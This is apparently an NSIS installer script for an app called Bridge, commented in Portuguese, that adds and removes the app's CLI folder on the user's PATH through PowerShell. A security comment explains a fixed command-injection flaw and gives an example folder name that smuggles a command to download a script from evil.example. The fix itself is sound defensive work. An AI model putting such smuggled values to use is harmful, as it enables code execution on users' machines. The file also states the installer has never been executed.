; Bridge — customizações do instalador NSIS (Fase 4, Task 5; reescrito na onda
; de correção final, R7).
;
; O que este arquivo faz: põe (e tira) `<INSTDIR>\resources\cli` no PATH do
; USUÁRIO, pra que `bridge` funcione em qualquer terminal depois de instalar.
; O `bridge.cmd` ao lado do `bridge.cjs` é o que o Windows resolve — `where
; bridge` tem que achar o `.cmd`, não o `.cjs`.
;
; Por que via PowerShell e não `ReadRegStr`/`WriteRegExpandStr` direto:
; `ReadRegStr` corta a string no `NSIS_MAX_STRLEN` do build de NSIS que estiver
; sendo usado. Um PATH de usuário mais longo que esse limite voltaria
; TRUNCADO, e escrever de volta apagaria em silêncio o resto do PATH da pessoa
; — um estrago irreversível por causa de uma conveniência.
;
; Por que o REGISTRO e não `[Environment]::SetEnvironmentVariable(…,'User')`
; (R7): o método do .NET grava `REG_SZ` quando o valor não tem `%`, e o PATH de
; usuário quase sempre é `REG_EXPAND_SZ` — trocar o tipo faz o `%JAVA_HOME%`
; (ou qualquer outra referência) da pessoa deixar de expandir, e entradas que
; funcionavam viram caminho literal inexistente. Aqui a leitura é crua
; (`GetValue(..., DoNotExpandEnvironmentNames)`: pega `%VAR%` como está, sem
; congelar a expansão de hoje no disco) e a escrita é sempre
; `-Type ExpandString`, que é o tipo canônico dessa chave.
;
; Quem grava no registro direto NÃO avisa ninguém: sem o `WM_SETTINGCHANGE`
; abaixo, o Explorer (e todo terminal aberto depois) só enxergaria o PATH novo
; no próximo logon. O broadcast vai com `SendMessageTimeout` (5 s, ABORTIFHUNG)
; e não `SendMessage`, pra uma janela travada de outro programa não pendurar o
; instalador.
;
; Falha (PowerShell bloqueado por política, .NET indisponível, caminho com
; aspa simples) NÃO derruba a instalação: o código de saída é descartado de
; propósito, o app instala do mesmo jeito e o README explica como pôr no PATH
; na mão.
;
; NÃO VERIFICADO PELO DONO: o instalador é gerado no `npm run dist`, mas nunca
; foi executado (constraint da fase). Ver BACKLOG, "Verificações pendentes".

; BR-13 (onda de seguranca 0.8.0). Texto sem acento neste bloco de proposito:
; o NSIS le o .nsh em ANSI. $INSTDIR NAO e mais interpolado cru dentro da
; string do PowerShell. `nsis.allowToChangeInstallationDirectory: true` deixa o
; usuario escolher a pasta, e a aspa simples e caractere VALIDO em nome de pasta
; no Windows: uma pasta como C:\Programas\O<aspa>Brien\Bridge fechava a string e o
; resto virava token de comando -- e uma pasta escolhida como
; C:\x<aspa>; iwr https://evil.example/p.ps1 -OutFile $env:TEMP\p.ps1; ... <aspa>
; executava o que viesse depois, com -ExecutionPolicy Bypass, na instalacao E na
; desinstalacao (onde o $INSTDIR vem do registro).
;
; A aspa DUPLA e impossivel em caminho do Windows, e a crase NAO e interpretada
; dentro de string de aspas SIMPLES do PowerShell -- entao dobrar a aspa simples
; (o escape do proprio PowerShell) fecha o caso por completo. ${WordReplace} faz
; a troca e o resultado ($R0) e o que entra na linha, no lugar do $INSTDIR.
!include "WordFunc.nsh"
!insertmacro WordReplace

; Avisa o Windows que o ambiente mudou (HWND_BROADCAST, WM_SETTINGCHANGE,
; SMTO_ABORTIFHUNG, 5 s). `$$` é o `$` do PowerShell escapado pro NSIS, e
; `\$\"` é a aspa dupla que o C# do `DllImport` precisa.
!macro bridgeBroadcastEnv
  nsExec::ExecToLog `powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "Add-Type -Namespace BridgeEnv -Name Native -MemberDefinition '[DllImport(\$\"user32.dll\$\",SetLastError=true)]public static extern IntPtr SendMessageTimeout(IntPtr hWnd,uint Msg,UIntPtr wParam,string lParam,uint fuFlags,uint uTimeout,out UIntPtr lpdwResult);'; $$r=[UIntPtr]::Zero; [void][BridgeEnv.Native]::SendMessageTimeout([IntPtr]0xffff,0x1A,[UIntPtr]::Zero,'Environment',2,5000,[ref]$$r)"`
  Pop $0
  DetailPrint "WM_SETTINGCHANGE: $0"
!macroend

!macro customInstall
  DetailPrint "Adicionando $INSTDIR\resources\cli ao PATH do usuário…"
  ${WordReplace} "$INSTDIR" "'" "''" "+" $R0
  nsExec::ExecToLog `powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$$d='$R0\resources\cli'; $$k='HKCU:\Environment'; $$i=Get-Item -Path $$k; $$v=$$i.GetValue('Path','',[Microsoft.Win32.RegistryValueOptions]::DoNotExpandEnvironmentNames); $$p=@($$v -split ';' | Where-Object {$$_ -ne ''}); if($$p -notcontains $$d){Set-ItemProperty -Path $$k -Name Path -Value ((@($$p) + $$d) -join ';') -Type ExpandString}"`
  Pop $0
  DetailPrint "PATH: $0"
  !insertmacro bridgeBroadcastEnv
!macroend

!macro customUnInstall
  DetailPrint "Removendo $INSTDIR\resources\cli do PATH do usuário…"
  ${WordReplace} "$INSTDIR" "'" "''" "+" $R0
  nsExec::ExecToLog `powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$$d='$R0\resources\cli'; $$k='HKCU:\Environment'; $$i=Get-Item -Path $$k; $$v=$$i.GetValue('Path','',[Microsoft.Win32.RegistryValueOptions]::DoNotExpandEnvironmentNames); if($$v -ne ''){$$p=@($$v -split ';' | Where-Object {$$_ -ne '' -and $$_ -ne $$d}); Set-ItemProperty -Path $$k -Name Path -Value ($$p -join ';') -Type ExpandString}"`
  Pop $0
  DetailPrint "PATH: $0"
  !insertmacro bridgeBroadcastEnv
!macroend
